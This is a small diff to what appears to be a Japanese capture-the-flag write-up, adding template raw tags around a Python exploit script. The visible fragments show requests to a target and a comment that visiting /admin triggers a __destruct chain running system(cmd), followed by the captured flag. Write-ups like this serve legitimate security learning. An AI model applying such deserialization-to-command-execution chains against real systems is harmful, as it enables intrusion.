@@ -980,6 +980,7 @@ print(token)
 
 このpayloadを頑張って組み立て、リクエストを送るスクリプトを書く。
 
+{% raw %}
 ```py
 #!/usr/bin/env python3
 import requests, time, jwt
@@ -1037,6 +1038,7 @@ assert r.status_code in (200, 302), f"update failed: {r.status_code}"
 # 2) /admin にアクセス → __destruct チェーンで system(cmd) 実行
 r = sess.get(f"{BASE}/admin")
 ```
+{% endraw %}
 
 flagが得られた。
 `flag{wh47'5_y0ur_fav0r173_s3r14l?}`
